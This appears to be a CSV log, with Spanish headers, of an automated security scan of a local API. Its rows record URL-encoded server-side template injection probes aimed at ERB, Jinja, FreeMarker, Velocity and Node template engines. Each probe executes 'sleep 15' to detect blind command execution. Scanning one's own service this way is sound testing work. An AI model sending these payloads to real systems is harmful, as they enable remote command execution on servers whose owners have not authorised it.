ID,Petición (Tiempo),Marca de tiempo Respuesta,Método,URL,Código,Razón,RTT,Tamaño de la Cabecera de Respuesta,Respuesta (Tamaño del cuerpo)
4510,Mon Jun 02 09:11:33 CEST 2025,Mon Jun 02 09:11:33 CEST 2025,GET,http://localhost:8080/api/v1/me?username=%3C%25%3D%25x%28sleep+15%29%25%3E,401,,1,400,0
4511,Mon Jun 02 09:11:33 CEST 2025,Mon Jun 02 09:11:33 CEST 2025,GET,http://localhost:8080/api/v1/weather?startDate=%7B%7B__import__%28%22subprocess%22%29.check_output%28%22sleep+15%22%2C+shell%3DTrue%29%7D%7D&endDate=endDate,401,,2,400,0
4512,Mon Jun 02 09:11:33 CEST 2025,Mon Jun 02 09:11:33 CEST 2025,GET,http://localhost:8080/api/v1/me?username=%23%7B%25x%28sleep+15%29%7D,401,,3,400,0
4513,Mon Jun 02 09:11:33 CEST 2025,Mon Jun 02 09:11:33 CEST 2025,GET,http://localhost:8080/api/v1/weather?startDate=%3C%25%3D%25x%28sleep+15%29%25%3E&endDate=endDate,401,,1,400,0
4514,Mon Jun 02 09:11:33 CEST 2025,Mon Jun 02 09:11:33 CEST 2025,GET,http://localhost:8080/api/v1/me?username=%7Bsystem%28%22sleep+15%22%29%7D,401,,2,400,0
4515,Mon Jun 02 09:11:33 CEST 2025,Mon Jun 02 09:11:33 CEST 2025,GET,http://localhost:8080/api/v1/weather?startDate=%23%7B%25x%28sleep+15%29%7D&endDate=endDate,401,,2,400,0
4516,Mon Jun 02 09:11:33 CEST 2025,Mon Jun 02 09:11:33 CEST 2025,GET,http://localhost:8080/api/v1/weather?startDate=%7Bsystem%28%22sleep+15%22%29%7D&endDate=endDate,401,,2,400,0
4517,Mon Jun 02 09:11:33 CEST 2025,Mon Jun 02 09:11:33 CEST 2025,GET,http://localhost:8080/api/v1/weather?startDate=startDate&endDate=%3C%23assign+ex%3D%22freemarker.template.utility.Execute%22%3Fnew%28%29%3E+%24%7B+ex%28%22sleep+15%22%29+%7D,401,,1,400,0
4518,Mon Jun 02 09:11:33 CEST 2025,Mon Jun 02 09:11:33 CEST 2025,GET,http://localhost:8080/api/v1/media?hashtag=%7B%7B%3D+global.process.mainModule.require%28%27child_process%27%29.execSync%28%27sleep+15%27%29.toString%28%29+%7D%7D,200,,10,401,2
4519,Mon Jun 02 09:11:33 CEST 2025,Mon Jun 02 09:11:33 CEST 2025,GET,http://localhost:8080/api/v1/weather?startDate=startDate&endDate=%23set%28%24engine%3D%22%22%29%0A%23set%28%24proc%3D%24engine.getClass%28%29.forName%28%22java.lang.Runtime%22%29.getRuntime%28%29.exec%28%22sleep+15%22%29%29%0A%23set%28%24null%3D%24proc.waitFor%28%29%29%0A%24%7Bnull%7D,401,,1,400,0
